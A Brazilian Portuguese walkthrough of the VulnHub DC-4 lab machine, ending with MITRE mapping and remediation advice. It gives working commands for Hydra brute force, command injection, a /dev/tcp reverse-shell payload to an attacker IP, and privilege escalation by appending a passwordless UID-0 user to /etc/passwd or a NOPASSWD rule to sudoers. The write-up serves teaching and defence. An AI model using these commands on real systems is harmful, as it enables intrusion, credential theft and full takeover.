# DC: 4 — Writeup (PT-BR)

> DC-4 traz uma cadeia de ataque completa que espelha achados reais de pentest interno mais do que qualquer entrada anterior da série. Injeção de comando em painel admin, credenciais em arquivo de backup, brute force SSH, pivot via e-mail local sem criptografia, e privesc via sudo usando uma ferramenta chamada `teehee` que escreve diretamente no `/etc/passwd`. Multi-hop, multi-usuário, dano máximo. GG, mano.

---

## Informações do Alvo

| Campo | Detalhes |
|-------|---------|
| **Nível** | Iniciante |
| **VM Alvo** | DC: 4 (VirtualBox/VMware, host-only) |
| **VM Atacante** | Kali Linux 2024.x |
| **IP Alvo** | 192.168.1.101 (adaptador host-only) |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-4,313/ |
| **Técnicas** | Brute force HTTP (Burp Suite / Hydra), injeção de comando, coleta de credenciais de arquivo de backup, brute force SSH (Hydra), movimento lateral via vazamento de credenciais no e-mail, injeção em `/etc/passwd` via sudo (teehee) |
| **CVEs** | Nenhum CVE específico; cadeia baseada em técnicas |
| **CISA KEV** | N/A; técnicas de injeção de comando (T1059) e misconfiguration de sudo (T1548.003) estão entre os achados mais comuns em pentests reais |
| **Grupos APT** | Injeção de comando e reutilização de credenciais são TTPs documentados para múltiplos grupos de ransomware (ex.: afiliados LockBit, Cl0p) e atores estado-nação que atacam painéis admin expostos |

---

## Resumo do Ataque

```
[Atacante]
    |
    +--[ nmap ]--> porta 22 (SSH), porta 80 (painel admin nginx)
    |
    +--[ Burp Suite / Hydra brute force ]--> admin:happy
    |
    +--[ Injeção de comando no painel System Tools ]--> shell www-data
    |
    +--[ cat /home/jim/backups/old-passwords.bak ]--> lista de senhas
    |
    +--[ Hydra brute force SSH ]--> jim:jibril04
    |
    +--[ cat /var/mail/jim ]--> charles:^xHhA&hvim0y
    |
    +--[ su charles ]--> shell charles
    |
    +--[ sudo teehee -a /etc/passwd ]--> injetar usuário root sem senha
    |
    +--[ su raaj ]--> shell root
    |
    +--[ cat /root/flag.txt ]--> FLAG CAPTURADA
```

---

## Metodologia

1. Descoberta de rede; HTTP na 80 (painel admin), SSH na 22
2. Brute force do painel admin com Burp Suite Intruder
3. Explorar injeção de comando no painel System Tools
4. Enumerar diretórios home; recuperar arquivo de backup com senhas
5. Brute force SSH com Hydra contra usuários enumerados
6. Pivot de jim para charles via vazamento de credenciais no e-mail local
7. Escalar para root via `sudo teehee` injetando entrada no `/etc/passwd`

---

## Passo 1: Descoberta de Rede

**Contexto:** Dois serviços: SSH e painel admin HTTP. Scan completo de portas primeiro; confirmar versões de serviço; acessar porta 80 para entender a aplicação. Recon antes de tudo, tá ligado?

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A 192.168.1.101
```

**Saída esperada:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian
80/tcp open  http    nginx 1.15.10
```

Acessar a porta 80 revela um formulário de login rotulado "Admin" com campos de usuário e senha.

**Nota real:** Painéis admin expostos na porta 80 sem VPN ou allowlisting de IP são achados comuns em testes de penetração externos. Autenticação via usuário/senha sem rate limiting ou bloqueio de conta é um convite a ataques de brute force.

**MITRE TTP:** T1046 - Network Service Discovery; T1595.002 - Active Scanning

![Scan Nmap](images/01-nmap.png)

---

## Passo 2: Brute Force do Painel Admin

**Contexto:** O painel admin aceita submissões de formulário POST. Use o Burp Suite Intruder para fazer brute force no campo senha para o usuário `admin` contra `rockyou.txt`. A credencial `admin:happy` é fraca e está em wordlists comuns. Tomou brute force de uma das senhas mais previsíveis que existe, vacilou.

Capturar a requisição POST de login no Burp Suite Proxy. Enviar para o Intruder.

Definir o campo `password` como posição de payload:

```
username=admin&password=§FUZZ§
```

Carregar `rockyou.txt` como payload.

Executar o ataque e identificar a resposta com tamanho diferente (ou redirecionamento para o dashboard): **admin / happy**

**Alternativa:** Usar Hydra diretamente:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.101 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

**Nota real:** "happy" está em todas as listas de senhas significativas. Portais admin sem rate limiting ou política de bloqueio são comprometidos trivialmente via brute force. O NIST SP 800-63B recomenda verificar credenciais contra listas de senhas comprometidas conhecidas.

**MITRE TTP:** T1110.001 - Brute Force: Password Guessing

![Burp brute force](images/02-burp-brute.png)

---

## Passo 3: Injeção de Comando via Painel System Tools

**Contexto:** Após o login, uma seção "Command" em "System Tools" permite que admins executem comandos do sistema. O parâmetro `cmd` é passado diretamente ao SO sem sanitização. É injeção de comando OS clássica (CWE-78). Não precisa de upload de shell: o painel já é um shell. Uma das piores misconfigurations possíveis, mano.

Capturar a requisição no Burp Repeater. Injetar no parâmetro `cmd`:

```
cmd=ls /home
```

**Saída esperada:**

```
charles
jim
sam
```

Enumerar o diretório de backup do jim:

```
cmd=ls /home/jim/backups
```

```
cmd=cat /home/jim/backups/old-passwords.bak
```

**Saída esperada (parcial):**

```
000000
ilikesomething
...
jibril04
...
```

Salvar a lista de senhas na máquina atacante.

**Alternativa:** Obter um reverse shell adequado via ponto de injeção:

```bash
# No atacante: iniciar listener
nc -lvnp 4444

# Payload de injeção
cmd=bash -c 'bash -i >& /dev/tcp/<IP-atacante>/4444 0>&1'
```

**Nota real:** Injeção de comando OS via painéis admin web está documentada em numerosos relatórios reais de incidentes. É uma das categorias do OWASP Top 10 (A03:2021 Injection). Qualquer aplicação que executa input do usuário via `exec()`, `shell_exec()`, `system()` ou similares é vulnerável.

**MITRE TTP:** T1059.004 - Command and Scripting Interpreter: Unix Shell; T1083 - File and Directory Discovery

![Injeção de comando](images/03-cmd-injection.png)

---

## Passo 4: Brute Force SSH com Hydra

**Contexto:** Três usuários, uma lista de senhas do arquivo de backup. Rodar Hydra contra SSH para encontrar qual usuário ainda usa uma senha antiga. `jim` reutilizou `jibril04`. Reutilização de senha clássica, top.

```bash
echo -e "charles\njim\nsam" > users.txt
# Colar conteúdo do old-passwords.bak em passwords.txt

hydra -L users.txt -P passwords.txt 192.168.1.101 ssh
```

**Saída esperada:**

```
[22][ssh] host: 192.168.1.101   login: jim   password: jibril04
```

**Alternativa:** Usar Medusa para brute force SSH multi-threaded:

```bash
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh
```

**Nota real:** Reutilização de senha é um dos achados de acesso a credenciais mais comuns em testes de penetração. Arquivos de backup contendo senhas históricas deixados em servidores são ouro para atacantes. Políticas de troca de senha devem incluir rotação de todas as senhas históricas conhecidas, não só a atual.

**MITRE TTP:** T1110.001 - Brute Force: Password Guessing; T1552.001 - Unsecured Credentials: Credentials in Files

---

## Passo 5: Movimento Lateral via Vazamento de Credenciais no E-mail

**Contexto:** SSH como jim. Verificar e-mail local. Root enviou a jim um e-mail com as credenciais de charles em texto puro. Credenciais sensíveis transmitidas via e-mail local sem criptografia: esse é um achado real em ambientes legados. Pivotar para charles via `su`.

```bash
ssh jim@192.168.1.101
# Senha: jibril04

cat /var/mail/jim
```

**Saída esperada (trecho relevante):**

```
From: root
To: jim
Subject: Creds

Hi Jim,

Your new friend is being moved to our organisation.
...

charles:^xHhA&hvim0y
```

```bash
su charles
# Senha: ^xHhA&hvim0y
```

**Nota real:** Credenciais transmitidas via e-mail local do sistema ou armazenadas em histórico de e-mail é um achado documentado em testes de penetração de rede interna, especialmente em ambientes Linux legados. `/var/mail/` é um artefato pós-exploração comum a verificar. Em incidentes reais, esse padrão aparece com creds armazenadas em mensagens Slack, e-mail sem criptografia, tickets de helpdesk e wikis internos.

**MITRE TTP:** T1552 - Unsecured Credentials; T1552.003 - Unsecured Credentials: Bash History

---

## Passo 6: Escalada de Privilégio via `sudo teehee`

**Contexto:** Verificar permissões sudo de charles. Ele pode rodar `/usr/bin/teehee` como root sem senha. `teehee` lê do stdin e acrescenta em um arquivo (equivalente ao `tee -a`). Com acesso de escrita como root em qualquer arquivo, injetar um usuário root sem senha no `/etc/passwd`. Caramba, essa é a privesc mais sorrateira da série. De verdade.

```bash
sudo -l
```

**Saída esperada:**

```
User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

Formato de entrada no `/etc/passwd` para usuário root sem senha:

```
username:password:UID:GID:comentario:home:shell
raaj::0:0:root:/root:/bin/bash
```

Injetar o novo usuário:

```bash
echo "raaj::0:0:root:/root:/bin/bash" | sudo teehee -a /etc/passwd
```

Trocar para o novo usuário com privilégio root:

```bash
su raaj
```

Nenhuma senha necessária (campo de senha vazio). Verificar acesso root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

**Abordagem alternativa usando a mesma técnica:**

```bash
# Injetar no /etc/sudoers em vez (se teehee puder escrever lá)
echo "charles ALL=(ALL) NOPASSWD: ALL" | sudo teehee -a /etc/sudoers
```

**Nota real:** Qualquer ferramenta que lê stdin e escreve em arquivos, quando concedida sudo sem restrições de senha, é um caminho direto para escrever conteúdo arbitrário como root. Inclui `tee`, `teehee`, `dd`, `cp`, `install` e muitas outras. A técnica de injeção no `/etc/passwd` não é teórica: está documentada em forense pós-comprometimento de incidentes reais. Mesmo sistemas Linux modernos com shadow passwords respeitam entradas UID:0 no `/etc/passwd` para troca de usuário.

**MITRE TTP:** T1548.003 - Abuse Elevation Control Mechanism: Sudo; T1136.001 - Create Account: Local Account

![Privesc teehee](images/04-teehee-privesc.png)
![Flag root](images/05-root-flag.png)

---

## Flags e Credenciais Capturadas

| Item | Valor / Localização |
|------|-------------------|
| Credenciais painel admin | admin:happy |
| Credenciais SSH (jim) | jim:jibril04 |
| Credenciais movimento lateral (charles) | charles:^xHhA&hvim0y |
| Arquivo de backup | `/home/jim/backups/old-passwords.bak` |
| Usuário root injetado | raaj (UID:0, sem senha) |
| Flag root | `/root/flag.txt` |

---

## Lições Aprendidas com Relevância no Mundo Real

1. **Senhas de admin previsíveis são facilmente quebradas por brute force.** "happy" está no rockyou.txt. Portais admin sem rate limiting, bloqueio de conta ou 2FA são alvos fáceis. Não é só um detalhe de CTF: é o primeiro achado em aproximadamente metade de todos os testes reais de aplicação web.

2. **Injeção de comando em painéis admin é RCE direto.** Um painel admin que passa input do usuário para `exec()` não é um painel admin: é um shell root esperando para acontecer. Validação de input e chamadas de API parametrizadas eliminam isso completamente.

3. **Arquivos de backup com senhas antigas são ouro para credenciais.** `old-passwords.bak` em um diretório home demonstra por que higiene de backup e exclusão segura importam. Em brechas reais, arquivos de histórico de senhas, `.bash_history` e backups de banco são tesouros.

4. **Credenciais sensíveis em e-mail plaintext não pertencem lá.** Mesmo e-mail local do sistema é acessível para quem compromete a conta. Credenciais devem ser entregues via sistemas de gerenciamento de segredos, não via `mail(1)`.

5. **Primitivos de escrita via sudo equivalem a root.** `teehee`, `tee`, `dd`, `install`: qualquer utilitário de escrita de arquivo concedido via sudo está a uma injeção no `/etc/passwd` de distância do root. Audite cada entrada NOPASSWD no sudoers para primitivos de escrita antes de implantar.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Observações |
|--------|---------|-----|------------|
| Acesso Inicial | Brute Force: Password Guessing | T1110.001 | Burp/Hydra contra painel admin |
| Execução | Command and Scripting Interpreter: Unix Shell | T1059.004 | Injeção de comando via System Tools |
| Descoberta | File and Directory Discovery | T1083 | Enumerando /home e arquivos de backup |
| Acesso a Credenciais | Unsecured Credentials: Credentials in Files | T1552.001 | old-passwords.bak |
| Movimento Lateral | Remote Services: SSH | T1021.004 | jim:jibril04 via Hydra |
| Acesso a Credenciais | Unsecured Credentials | T1552 | Credenciais plaintext em /var/mail/jim |
| Movimento Lateral | Valid Accounts | T1078 | su charles |
| Escalada de Privilégio | Abuse Elevation Control Mechanism: Sudo | T1548.003 | sudo teehee escrita em /etc/passwd |
| Persistência | Create Account: Local Account | T1136.001 | Injetar raaj (UID:0) no /etc/passwd |
| Coleta | Data from Local System | T1005 | Leitura de flag root |

---

## Remediação

### Vulnerabilidade: Painel Admin Sujeito a Brute Force

**Funções NIST CSF 2.0:** Protect (PR.AC-1, PR.AC-3), Detect (DE.CM-7)

**Controles NIST SP 800-53:**
- AC-7: Unsuccessful Logon Attempts (implementar bloqueio de conta após N falhas)
- IA-5: Authenticator Management (senhas fortes; verificar contra lista de brechas do NIST SP 800-63B)
- IA-2(12): Multi-Factor Authentication for Privileged Accounts (exigir 2FA para acesso admin)

**C2M2:** MIL1 - Aplicar políticas de senha e 2FA; MIL2 - Monitorar falhas de autenticação.

**D3FEND:** D3-AL (Account Locking) para implementar bloqueio; D3-MFA (Multi-Factor Authentication).

---

### Vulnerabilidade: Injeção de Comando OS

**Controles NIST SP 800-53:**
- SI-10: Information Input Validation (sanitizar todos os inputs; evitar passar dados do usuário para shell)
- SA-11: Developer Testing (SAST/DAST para vulnerabilidades de injeção no CI/CD)
- CM-7: Least Functionality (rodar servidor web como usuário de privilégio mínimo; restringir acesso shell)

**Remediação (código):** Substituir `exec($cmd)` por chamadas de API parametrizadas. Se comandos OS são necessários, usar listas de permitidos e arrays de argumentos em vez de concatenação de strings.

**D3FEND:** D3-OAL (Operating System API Limiting) para restringir execução de shell por processos web.

---

### Vulnerabilidade: Credenciais em Arquivos de Backup e E-mail Local

**Controles NIST SP 800-53:**
- SC-28: Protection of Information at Rest (criptografar arquivos sensíveis em repouso)
- AC-3: Access Enforcement (restringir acesso a diretórios de backup; aplicar permissões de arquivo)
- IA-5: Authenticator Management (rotacionar senhas; purgar arquivos de credenciais históricas)

**Remediação:**

```bash
# Remover arquivos de backup com credenciais antigas
shred -u /home/jim/backups/old-passwords.bak

# Garantir permissões adequadas em diretórios home
chmod 750 /home/jim/backups
```

---

### Vulnerabilidade: sudo teehee NOPASSWD (primitivo de escrita)

**Controles NIST SP 800-53:**
- AC-6: Least Privilege (remover todas as entradas NOPASSWD sudo para utilitários de escrita de arquivo)
- CM-6: Configuration Settings (auditar sudoers; aplicar baseline com gerenciamento de configuração)
- AU-9: Protection of Audit Information (prevenir escrita em arquivos críticos do sistema por não-root)

**Remediação:**

```bash
# Remover de /etc/sudoers:
# charles ALL=(root) NOPASSWD: /usr/bin/teehee

# Auditar todas as entradas NOPASSWD:
grep -i nopasswd /etc/sudoers /etc/sudoers.d/*
```

**D3FEND:** D3-SEA (Sudo Execution Analysis); D3-SFH (System File Monitoring) para alertar sobre modificações no `/etc/passwd`.

---

## Considerações Finais

DC-4 é a máquina mais operacionalmente realista da série DC inicial. A cadeia de ataque atinge quatro classes distintas de vulnerabilidade: autenticação fraca, injeção de comando, armazenamento inseguro de credenciais e misconfiguration de sudo. Cada achado mapeia diretamente para uma categoria real de relatório de pentest. Se você caminhou por cada passo e entendeu o "porquê" por trás de cada pivot, tem os fundamentos para conduzir testes de penetração reais de rede interna. As ferramentas mudam; a metodologia não, véi.

Thanks guys!! (❍ᴥ❍ʋ)
